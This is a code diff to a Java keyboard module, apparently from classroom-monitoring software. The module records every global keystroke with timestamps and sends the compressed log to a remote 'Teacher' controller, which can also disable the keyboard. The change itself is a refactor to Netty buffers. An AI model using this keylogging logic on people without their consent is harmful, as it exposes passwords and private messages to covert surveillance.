@@ -5,12 +5,14 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import com.godpalace.student.Teacher;
 import com.godpalace.student.manager.ThreadPoolManager;
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.Unpooled;
 import lombok.extern.slf4j.Slf4j;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
-import java.nio.ByteBuffer;
+import java.io.Serializable;
 import java.util.Date;
 import java.util.LinkedList;
 import java.util.concurrent.ConcurrentLinkedDeque;
@@ -44,7 +46,7 @@ public class KeyboardModule implements Module {
                 int key = nativeEvent.getKeyCode();
 
                 if (keyboardData.isEmpty() || key == NativeKeyEvent.VC_ENTER ||
-                        Math.abs(newDate.getTime() - keyboardData.peekLast().date().getTime()) > 2000) {
+                        Math.abs(newDate.getTime() - keyboardData.peekLast().date()) > 2000) {
 
                     LinkedList<Integer> keys = new LinkedList<>();
                     if (key != NativeKeyEvent.VC_ENTER) {
@@ -55,7 +57,7 @@ public class KeyboardModule implements Module {
                         }
                     }
 
-                    keyboardData.add(new KeyboardData(newDate, keys));
+                    keyboardData.add(new KeyboardData(newDate.getTime(), keys));
                 } else {
                     keyboardData.peekLast().keys().add(key);
                 }
@@ -110,37 +112,38 @@ public class KeyboardModule implements Module {
     }
 
     @Override
-    public void execute(Teacher teacher, ByteBuffer data) throws Exception {
-        switch (data.getShort()) {
+    public ByteBuf execute(Teacher teacher, ByteBuf data) throws Exception {
+        switch (data.readShort()) {
             case GET_KEYBOARD_RECORD -> {
-                ByteArrayOutputStream out = new ByteArrayOutputStream();
-                GZIPOutputStream gzipOut = new GZIPOutputStream(out);
+                ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
+                GZIPOutputStream gzipOut = new GZIPOutputStream(byteOut);
                 ObjectOutputStream objOut = new ObjectOutputStream(gzipOut);
 
-                for (KeyboardData keyboardDatum : keyboardData) {
-                    keyboardDatum.writeToStream(objOut);
+                for (KeyboardData keyboard : keyboardData) {
+                    keyboard.writeToStream(objOut);
                 }
 
                 objOut.flush();
                 gzipOut.finish();
                 gzipOut.flush();
-                out.flush();
+                byteOut.flush();
 
-                ByteBuffer buffer = ByteBuffer.allocate(out.size() + 4);
-                buffer.putInt(keyboardData.size());
-                buffer.put(out.toByteArray());
-                buffer.flip();
-
-                sendResponseWithSize(teacher.getChannel(), buffer);
+                ByteBuf response = Unpooled.buffer(2 + byteOut.size());
+                response.writeShort((short) keyboardData.size());
+                response.writeBytes(byteOut.toByteArray());
 
                 objOut.close();
                 gzipOut.close();
-                out.close();
+                byteOut.close();
+
+                return response;
             }
 
             case DISABLE_KEYBOARD -> DisableKeyboard();
             case ENABLE_KEYBOARD -> EnableKeyboard();
         }
+
+        return null;
     }
 
     @Override
@@ -148,9 +151,9 @@ public class KeyboardModule implements Module {
         return false;
     }
 
-    record KeyboardData(Date date, LinkedList<Integer> keys) {
+    record KeyboardData(long date, LinkedList<Integer> keys) implements Serializable {
         public void writeToStream(ObjectOutputStream out) throws IOException {
-            out.writeObject(date);
+            out.writeLong(date);
             out.writeObject(keys);
         }
     }
